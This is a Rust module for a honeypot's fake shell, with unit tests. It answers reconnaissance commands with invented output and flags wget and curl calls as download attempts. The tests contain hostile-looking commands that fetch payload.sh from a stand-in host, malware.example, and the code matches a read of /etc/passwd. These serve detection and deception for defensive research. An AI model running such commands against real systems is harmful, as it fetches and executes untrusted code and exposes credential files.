//! The fake shell served after a successful login.
//!
//! Every answer is invented: the trap never touches a real system. The responses exist
//! to keep the attacker talking so the operator can watch and record what it does.

/// What the fake shell answers to one command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellResponse {
    pub output: String,
    /// The attacker asked to leave.
    pub exit: bool,
    /// The attacker tried to download something.
    pub download: bool,
}

const PASSWD: &str = "root:x:0:0:root:/root:/bin/bash\n\
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n\
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash";

/// Answers one command the way the fake host would.
pub fn respond(command: &str) -> ShellResponse {
    let trimmed = command.trim();
    let lower = trimmed.to_lowercase();

    if lower == "exit" || lower == "logout" {
        return ShellResponse {
            output: "logout".to_string(),
            exit: true,
            download: false,
        };
    }

    if lower == "uname -a" {
        return plain(
            "Linux victima 6.5.0-14-generic #14-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux",
        );
    }
    if lower == "uname" {
        return plain("Linux");
    }
    if lower == "whoami" {
        return plain("root");
    }
    if lower == "id" {
        return plain("uid=0(root) gid=0(root) groups=0(root)");
    }
    if lower == "hostname" {
        return plain("victima");
    }
    if lower == "pwd" {
        return plain("/root");
    }
    if lower == "ls" || lower == "ls -la" {
        return plain("snap  snapd  srv  sys  tmp  usr  var");
    }
    if lower == "cat /etc/passwd" {
        return plain(PASSWD);
    }
    if lower.starts_with("wget ") || lower.starts_with("curl ") {
        let url = trimmed.split_whitespace().nth(1).unwrap_or("destino");
        return ShellResponse {
            output: format!(
                "Connecting to {url}\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 [application/x-sh]\nsaved to 'index.html'"
            ),
            exit: false,
            download: true,
        };
    }

    plain(&format!("bash: {trimmed}: command not found"))
}

fn plain(output: &str) -> ShellResponse {
    ShellResponse {
        output: output.to_string(),
        exit: false,
        download: false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn answers_uname_with_a_fake_kernel() {
        let response = respond("uname -a");
        assert!(response.output.contains("Linux victima"));
        assert!(!response.exit);
        assert!(!response.download);
    }

    #[test]
    fn answers_whoami_and_id() {
        assert_eq!(respond("whoami").output, "root");
        assert!(respond("id").output.contains("uid=0(root)"));
    }

    #[test]
    fn answers_cat_passwd_with_fake_users() {
        let response = respond("cat /etc/passwd");
        assert!(response.output.contains("root:x:0:0"));
        assert!(response.output.contains("ubuntu"));
    }

    #[test]
    fn detects_a_download_attempt() {
        let response = respond("wget http://malware.example/payload.sh");
        assert!(response.download);
        assert!(response.output.contains("200 OK"));
    }

    #[test]
    fn detects_curl_as_a_download_attempt() {
        assert!(respond("curl http://malware.example/payload.sh").download);
    }

    #[test]
    fn exit_ends_the_session() {
        assert!(respond("exit").exit);
        assert!(respond("logout").exit);
    }

    #[test]
    fn unknown_command_looks_like_a_real_shell() {
        let response = respond("frobnicate --all");
        assert_eq!(response.output, "bash: frobnicate --all: command not found");
    }
}
